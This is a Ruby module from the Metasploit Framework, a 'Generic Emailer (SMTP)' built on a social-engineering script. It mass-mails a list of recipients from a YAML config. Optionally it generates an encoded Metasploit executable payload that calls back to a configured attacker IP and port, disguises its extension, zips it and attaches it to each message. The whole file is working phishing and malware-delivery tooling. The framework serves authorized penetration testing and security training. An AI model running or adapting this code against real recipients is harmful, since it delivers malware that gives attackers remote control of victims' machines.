
##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'yaml'


class Metasploit3 < Msf::Auxiliary

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic Emailer (SMTP)',
			'Description'    => %q{
				This module can be used to automate email delivery.
			This code is based on Joshua Abraham's email script for social 
			engineering.
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6973 $',
			'References'     =>
				[
					[ 'URL', 'http://spl0it.org/' ],
				],	
			'Author'         => [ 'et <et[at]metasploit.com>' ]))
			
			register_options(
				[	
					OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
					OptString.new('RPORT', [true, "SMTP server port",'25']),
					OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",File.join(Msf::Config.install_root, "data","emailer_config.yaml")]),
				], self.class)	
		
		# Hide this option from the user		
		deregister_options('MAILTO')
	end
	
	def run

		fileconf = File.open(datastore['YAML_CONFIG'])
		yamlconf = YAML::load(fileconf) 
		
		fileto = yamlconf['to'] 
		from = yamlconf['from']
		subject = yamlconf['subject']
		type = yamlconf['type']
		msg_file = yamlconf['msg_file']
		wait = yamlconf['wait']
		add_name = yamlconf['add_name']
		sig = yamlconf['sig']
		sig_file = yamlconf['sig_file']
		attachment = yamlconf['attachment']
		attachment_file = yamlconf['attachment_file']
		attachment_file_type = yamlconf['attachment_file_type']
		attachment_file_name = yamlconf['attachment_file_name']
       
        ### payload options ###
        make_payload    = yamlconf['make_payload']
        zip_payload     = yamlconf['zip_payload']
        msf_port        = yamlconf['msf_port']
        msf_ip          = yamlconf['msf_ip']
        msf_payload     = yamlconf['msf_payload']
        msf_location    = yamlconf['msf_location']
        msf_filename    = yamlconf['msf_filename']
        msf_change_ext  = yamlconf['msf_change_ext']
        msf_payload_ext = yamlconf['msf_payload_ext']


		datastore['MAILFROM'] = from
		
		msg = File.open(msg_file).read

		email_sig = File.open(sig_file).read

		if (type !~ /text/i and type !~ /text\/html/i)	
			print_error("YAML config: #{type}")
		end
        
        if  make_payload 

            print_status("Creating payload...")
            system(
                "#{msf_location}/msfpayload #{msf_payload} LHOST=#{msf_ip} LPORT=#{msf_port} R | #{msf_location}/msfencode -t exe -o /tmp/#{msf_filename} > /dev/null 2>&1")

            if msf_change_ext 
                msf_payload_newext = msf_filename
                msf_payload_newext = msf_payload_newext.gsub /\.\w+/, ".#{msf_payload_ext}"
                system("mv /tmp/#{msf_filename} /tmp/#{msf_payload_newext}")
                msf_filename = msf_payload_newext
            end

            if zip_payload 
                zip_file = msf_filename
                zip_file = zip_file.gsub /\.\w+/, '.zip' 
                system("zip -r /tmp/#{zip_file} /tmp/#{msf_filename} > /dev/null 2>&1");
                msf_filename         = zip_file
                attachment_file_type = 'application/zip'
            else 
                attachment_file_type = 'application/exe'
            end

            attachment_file = "/tmp/#{msf_filename}"
            attachment_file_name = msf_filename
        end


		File.open(fileto).each do |l|
			if l !~ /\@/
				nil
			end
		
			nem = l.split(',')
			name = nem[0].split(' ')
			fname = name[0]
			lname = name[1]
			email = nem[1]
			
			
			if add_name 
				email_msg_body = "#{fname},\n\n#{msg}" 			
			else 
				email_msg_body = msg
			end

			if sig
				data_sig = File.open(sig_file).read
				email_msg_body = "#{email_msg_body}\n#{data_sig}"
			end
			
			print_status("Emailing #{name[0]} #{name[1]} at #{email}")

			mime_msg = Rex::MIME::Message.new
			mime_msg.mime_defaults

			mime_msg.from = from
			mime_msg.to = email
			datastore['MAILTO'] = email.strip
			mime_msg.subject = subject
			
			mime_msg.add_part(Rex::Text.encode_base64(email_msg_body, "\r\n"), type, "base64", "inline")
				
			if attachment
				if attachment_file_name
					data_attachment = File.open(attachment_file).read
					mime_msg.add_part(Rex::Text.encode_base64(data_attachment, "\r\n"), attachment_file_type, "base64", "attachment; filename=\"#{attachment_file_name}\"")
				end
			end
			
			send_message(mime_msg.to_s)
			sleep wait		
		end
	
		print_status("Email sent..")
	end
 end

	
